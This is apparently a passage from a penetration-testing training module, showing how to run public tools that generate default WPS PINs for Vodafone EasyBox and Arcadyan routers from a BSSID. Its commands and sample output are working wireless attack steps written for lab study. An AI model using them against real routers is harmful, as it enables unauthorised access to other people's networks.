### Using the Vodafone EasyBox Default WPS Pin Algorithm

To begin, we can use a tool called [Default-wps-pin](https://github.com/eye9poob/Default-wps-pin), and start by cloning it from Github.

```sh
3kjS@htb[/htb]$ git clone https://github.com/eye9poob/Default-wps-pin
```

Then, to use the tool, we simply employ the following command. We specify our BSSID, then observe as possible PINs are outputted into the terminal.

```sh
3kjS@htb[/htb]$ python2 /opt/Default-wps-pin/default-wps-pin.py 60:38:E0:D4:A2:5E

derived serial number: R----55185
SSID: Arcor|EasyBox|Vodafone-04D755
WPS pin: 27038895
```
### Using WPS-PIN to Generate Default PIN

We can also use another script called [WPS-PIN](https://github.com/linkp2p/WPS-PIN) to generate the WPS PIN from the BSSID.

```sh
3kjS@htb[/htb]$ /opt/WPSPIN.sh
```
### Using Naranja MekaniK (nmk) to generate WPS PIN

[Naranja MekaniK (nmk)](https://github.com/kcdtv/nmk) is a tool kit that proposes different ways to generate the default WPS PIN for:

- Arcadyan ARV7519RW22
- Arcadyan ARV7520CW22
- Arcadyan VRV9510KWAC23

```sh
3kjS@htb[/htb]$  python2 /opt/nmk/orangen.py A2BD 7281

99559236
```
